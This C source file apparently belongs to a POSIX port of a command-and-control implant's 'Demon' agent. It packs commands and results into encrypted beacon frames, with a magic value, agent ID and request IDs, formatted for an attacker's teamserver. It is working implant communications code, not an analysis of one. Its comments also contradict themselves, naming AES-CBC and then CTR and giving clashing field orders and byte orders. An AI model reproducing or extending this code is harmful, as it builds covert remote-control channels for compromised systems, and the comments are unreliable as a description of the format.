/*
 * Package.c — Binary serialization (packer) for the POSIX Demon agent.
 *
 * The wire format is identical to the Windows Demon so the teamserver's
 * existing BuildPayloadMessage / ParseHeader code handles both agents
 * without modification.
 *
 * Frame layout (little-endian):
 *   [4] SIZE         total frame size (not including this field)
 *   [4] MAGIC VALUE  0xDEADBEEF
 *   [4] AGENT ID
 *   [4] COMMAND ID
 *   [4] REQUEST ID
 *   [4] DATA SIZE    size of the (encrypted) data blob
 *   [N] DATA         AES-256 CBC encrypted payload
 */

#include "DemonPosix.h"
#include <stdlib.h>
#include <string.h>

/* ── Internal helpers ────────────────────────────────────────────────── */

static inline void put_u32_le(uint8_t *buf, uint32_t v)
{
    buf[0] = (uint8_t)(v);
    buf[1] = (uint8_t)(v >> 8);
    buf[2] = (uint8_t)(v >> 16);
    buf[3] = (uint8_t)(v >> 24);
}

/* The teamserver parser (ParseHeader + subsequent ParseInt32 calls) uses
 * big-endian for the outer frame header: SIZE, MAGIC, AGENTID, CMD, REQID.
 * Inner encrypted payload fields are little-endian (BuildPayloadMessage uses
 * binary.LittleEndian in Go). */
static inline void put_u32_be(uint8_t *buf, uint32_t v)
{
    buf[0] = (uint8_t)(v >> 24);
    buf[1] = (uint8_t)(v >> 16);
    buf[2] = (uint8_t)(v >>  8);
    buf[3] = (uint8_t)(v      );
}

static inline void put_u64_le(uint8_t *buf, uint64_t v)
{
    put_u32_le(buf,   (uint32_t)(v));
    put_u32_le(buf+4, (uint32_t)(v >> 32));
}

static void pkg_ensure(PKG_BUFFER *pkg, size_t extra)
{
    if (pkg->Length + extra <= pkg->Capacity) return;
    size_t new_cap = pkg->Capacity + extra + 4096;
    pkg->Buffer    = (uint8_t *)realloc(pkg->Buffer, new_cap);
    pkg->Capacity  = new_cap;
}

/* ── Public API ─────────────────────────────────────────────────────── */

PKG_BUFFER *PkgCreate(uint32_t commandID, uint32_t requestID)
{
    PKG_BUFFER *pkg = (PKG_BUFFER *)calloc(1, sizeof(PKG_BUFFER));
    if (!pkg) return NULL;

    /* Pre-allocate a reasonable buffer */
    pkg->Capacity = 256;
    pkg->Buffer   = (uint8_t *)malloc(pkg->Capacity);
    pkg->Length   = 0;

    /* Write command ID and request ID at the start of the buffer.
     * PkgBuildMessage extracts these and places them unencrypted in the
     * outer frame header (big-endian), where ParseInt32() reads them. */
    pkg_ensure(pkg, 8);
    put_u32_le(pkg->Buffer + pkg->Length,     commandID); /* extracted as LE then rewritten BE */
    pkg->Length += 4;
    put_u32_le(pkg->Buffer + pkg->Length,     requestID);
    pkg->Length += 4;

    return pkg;
}

void PkgAddInt32(PKG_BUFFER *pkg, int32_t val)
{
    pkg_ensure(pkg, 4);
    /* The teamserver parser uses big-endian for all fields in the
     * decrypted registration body (ParseInt32 with bigEndian=true). */
    put_u32_be(pkg->Buffer + pkg->Length, (uint32_t)val);
    pkg->Length += 4;
}

void PkgAddInt64(PKG_BUFFER *pkg, int64_t val)
{
    pkg_ensure(pkg, 8);
    /* Big-endian 64-bit for teamserver compatibility */
    uint64_t v = (uint64_t)val;
    uint8_t *b = pkg->Buffer + pkg->Length;
    b[0] = (uint8_t)(v >> 56); b[1] = (uint8_t)(v >> 48);
    b[2] = (uint8_t)(v >> 40); b[3] = (uint8_t)(v >> 32);
    b[4] = (uint8_t)(v >> 24); b[5] = (uint8_t)(v >> 16);
    b[6] = (uint8_t)(v >>  8); b[7] = (uint8_t)(v      );
    pkg->Length += 8;
}

void PkgAddBytes(PKG_BUFFER *pkg, const uint8_t *data, uint32_t len)
{
    pkg_ensure(pkg, 4 + len);
    put_u32_be(pkg->Buffer + pkg->Length, len);  /* BE length prefix */
    pkg->Length += 4;
    if (len > 0) {
        memcpy(pkg->Buffer + pkg->Length, data, len);
        pkg->Length += len;
    }
}

void PkgAddString(PKG_BUFFER *pkg, const char *str)
{
    uint32_t len = (uint32_t)(str ? strlen(str) : 0) + 1; /* include NUL */
    pkg_ensure(pkg, 4 + len);
    put_u32_be(pkg->Buffer + pkg->Length, len);  /* BE length prefix */
    pkg->Length += 4;
    if (str) memcpy(pkg->Buffer + pkg->Length, str, len);
    else     pkg->Buffer[pkg->Length] = 0;
    pkg->Length += len;
}

void PkgFree(PKG_BUFFER *pkg)
{
    if (!pkg) return;
    if (pkg->Buffer) free(pkg->Buffer);
    free(pkg);
}

/*
 * PkgBuildMessage — wrap the payload in the full C2 frame and AES-encrypt
 * the data section.
 *
 * Frame layout written to the returned buffer:
 *   [4] total_size  (SIZE field = everything after this uint32)
 *   [4] 0xDEADBEEF
 *   [4] AgentID
 *   [4] DATA_SIZE   (size of AES-encrypted blob)
 *   [N] encrypted payload
 *
 * Caller must free() the returned buffer.
 */
uint8_t *PkgBuildMessage(PKG_BUFFER *pkg, const uint8_t *aes_key,
                         const uint8_t *aes_iv, size_t *out_len)
{
    if (!pkg || !aes_key || !aes_iv || !DemonInstance) return NULL;

    /*
     * Frame layout (all outer header fields big-endian, inner data little-endian):
     *
     *   [4 BE] SIZE          = bytes after this field
     *   [4 BE] MAGIC         = DEMON_MAGIC_VALUE
     *   [4 BE] AGENT_ID
     *   [4 BE] COMMAND_ID    ← unencrypted, read by server ParseInt32() BE
     *   [4 BE] REQUEST_ID    ← unencrypted
     *   [4 BE] DATA_SIZE     ← size of encrypted blob (ParseBytes reads this BE)
     *   [N]    AES-CTR(data) ← encrypted payload (may be 0 bytes for beacon)
     *
     * The server's handleDemonAgent loop reads COMMAND+REQID before calling
     * DecryptBuffer, so they must be plaintext in the header.
     */

    /* Extract COMMAND_ID and REQUEST_ID from start of pkg->Buffer (LE stored) */
    uint32_t cmdId = 0, reqId = 0;
    if (pkg->Length >= 8) {
        cmdId  = (uint32_t)pkg->Buffer[0]
               | ((uint32_t)pkg->Buffer[1] << 8)
               | ((uint32_t)pkg->Buffer[2] << 16)
               | ((uint32_t)pkg->Buffer[3] << 24);
        reqId  = (uint32_t)pkg->Buffer[4]
               | ((uint32_t)pkg->Buffer[5] << 8)
               | ((uint32_t)pkg->Buffer[6] << 16)
               | ((uint32_t)pkg->Buffer[7] << 24);
    } else if (pkg->Length >= 4) {
        cmdId  = (uint32_t)pkg->Buffer[0]
               | ((uint32_t)pkg->Buffer[1] << 8)
               | ((uint32_t)pkg->Buffer[2] << 16)
               | ((uint32_t)pkg->Buffer[3] << 24);
    }

    /* The data payload is everything after COMMAND_ID + REQUEST_ID (8 bytes).
     * For a pure beacon (no data), this is empty. */
    const uint8_t *data_payload     = pkg->Length > 8 ? pkg->Buffer + 8 : NULL;
    size_t         data_payload_len = pkg->Length > 8 ? pkg->Length - 8 : 0;

    /*
     * The data blob that follows CMD+REQID is decrypted by the server's
     * DecryptBuffer (CTR, entire remaining Header.Data), then read via
     * ParseBytes() which expects: [4 BE length][length bytes of content].
     *
     * So we must encrypt: [4 BE data_payload_len][data_payload]
     * so that after decryption ParseBytes() reads the length correctly.
     */

    /* Build the plaintext blob: [4 BE len][payload] */
    size_t   plain_len = 4 + data_payload_len;
    uint8_t *plain_buf = (uint8_t *)malloc(plain_len);
    if (!plain_buf) return NULL;
    put_u32_be(plain_buf, (uint32_t)data_payload_len);
    if (data_payload_len > 0)
        memcpy(plain_buf + 4, data_payload, data_payload_len);

    /* Encrypt the whole thing */
    size_t   enc_len   = plain_len;   /* CTR: no padding, same size */
    uint8_t *enc_buf   = (uint8_t *)malloc(enc_len);
    if (!enc_buf) { free(plain_buf); return NULL; }
    size_t actual_enc = 0;
    if (AES256_Encrypt(plain_buf, plain_len, enc_buf, &actual_enc, aes_key, aes_iv) != 0) {
        free(plain_buf); free(enc_buf); return NULL;
    }
    free(plain_buf);

    /*
     * Frame body (after SIZE field):
     *   MAGIC(4) + AGENTID(4) + CMD(4) + REQ(4) + encrypted([len(4)+payload])
     *
     * No separate ENC_SIZE field — the length is inside the encrypted blob.
     */
    size_t frame_body = 4 + 4 + 4 + 4 + actual_enc;
    size_t total      = 4 + frame_body;

    uint8_t *frame = (uint8_t *)malloc(total);
    if (!frame) { free(enc_buf); return NULL; }

    size_t off = 0;
    put_u32_be(frame + off, (uint32_t)frame_body);           off += 4; /* SIZE     */
    put_u32_be(frame + off, DEMON_MAGIC_VALUE);              off += 4; /* MAGIC    */
    put_u32_be(frame + off, DemonInstance->Session.AgentID); off += 4; /* AGENT_ID */
    put_u32_be(frame + off, cmdId);                          off += 4; /* CMD      */
    put_u32_be(frame + off, reqId);                          off += 4; /* REQ_ID   */
    memcpy(frame + off, enc_buf, actual_enc);                off += actual_enc;

    free(enc_buf);
    *out_len = total;
    return frame;
}
